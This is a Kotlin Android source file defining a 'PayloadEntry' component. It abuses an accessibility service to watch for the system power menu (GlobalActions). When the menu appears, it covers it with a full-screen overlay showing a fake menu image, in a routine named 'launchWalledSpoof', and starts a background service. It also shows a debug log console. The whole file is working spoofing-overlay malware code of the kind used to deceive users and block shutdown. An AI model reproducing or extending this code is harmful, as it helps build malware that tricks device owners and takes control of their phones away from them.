import com.speedster.DynamicEntry
import java.io.File
import kotlin.math.sqrt

class PayloadEntry : DynamicEntry {

    private var isTriggered by mutableStateOf(false)

    @Composable
    override fun Render(context: Context, resDir: File) {
        val serviceName = context.javaClass.simpleName
        val clipboard = LocalClipboardManager.current

        // Monitor logic only runs if started by the shell components
        LaunchedEffect(Unit) {
            DynamicEntry.log("🆔 Session started by: $serviceName")

            // Only register the interceptor once
            if (DynamicEntry.accessibilityInterceptor == null) {
                DynamicEntry.log("🛡️ Monitor Armed: Waiting for GlobalActions...")
                DynamicEntry.accessibilityInterceptor = { event ->
                    val service = DynamicEntry.activeAccessibilityService
                    val root = service?.rootInActiveWindow
                    if (root != null && !isTriggered) {
                        if (findNode(root)) {
                            DynamicEntry.log("🎯 TRIGGER: GlobalActions detected!")
                            isTriggered = true
                            launchWalledSpoof(context, resDir)
                        }
                    }
                }
            }
        }

        // THE UI BOX - This only renders when isTriggered is true AND it's in a Service
        if (isTriggered && serviceName != "MainActivity") {
            Box(modifier = Modifier.fillMaxSize().systemBarsPadding()) {
                val imageFile = File(resDir, "fake_menu.png")
                if (imageFile.exists()) {
                    val bitmap = BitmapFactory.decodeFile(imageFile.absolutePath)
                    Image(
                        bitmap = bitmap.asImageBitmap(),
                        contentDescription = null,
                        modifier = Modifier.fillMaxSize(),
                        contentScale = ContentScale.FillBounds
                    )
                }

                // LOG CONSOLE (Bottom 40%)
                Box(
                    modifier = Modifier.align(Alignment.BottomCenter).fillMaxWidth().fillMaxHeight(0.4f)
                        .background(Color.Black.copy(alpha = 0.8f)).padding(8.dp)
                ) {
                    val listState = rememberLazyListState()
                    Column {
                        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                            Text("AUTHORITY: $serviceName", color = Color.Cyan, fontSize = 10.sp)
                            Button(onClick = { 
                                clipboard.setText(AnnotatedString(DynamicEntry.systemLogs.joinToString("\n"))) 
                            }, modifier = Modifier.height(24.dp), contentPadding = PaddingValues(0.dp)) {
                                Text("COPY", fontSize = 8.sp)
                            }
                        }
                        LazyColumn(state = listState, modifier = Modifier.fillMaxSize()) {
                            items(DynamicEntry.systemLogs) { log ->
                                Text(log, color = Color.LightGray, fontSize = 9.sp, fontFamily = FontFamily.Monospace)
                            }
                        }
                    }
                    LaunchedEffect(DynamicEntry.systemLogs.size) { 
                        if (DynamicEntry.systemLogs.isNotEmpty()) listState.scrollToItem(DynamicEntry.systemLogs.size - 1) 
                    }
                }
            }
        }
    }

    private fun findNode(node: AccessibilityNodeInfo): Boolean {
        val id = node.viewIdResourceName ?: ""
        if (id.contains("sec_global_actions")) return true
        val className = node.className?.toString() ?: ""
        if (className.contains("GlobalActions")) return true
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (findNode(child)) return true
        }
        return false
    }

    private fun launchWalledSpoof(context: Context, resDir: File) {
        // CRITICAL: FLAG_NOT_FOCUSABLE allows system button interaction
        DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            width = WindowManager.LayoutParams.MATCH_PARENT,
            height = WindowManager.LayoutParams.MATCH_PARENT
        )

        DynamicEntry.overlayContent = { Render(context, resDir) }

        try {
            val intent = Intent(context, Class.forName("com.speedster.BackgroundStub"))
            context.startService(intent)
        } catch (e: Exception) { DynamicEntry.log("❌ Service Start Fail: ${e.message}") }
    }
}

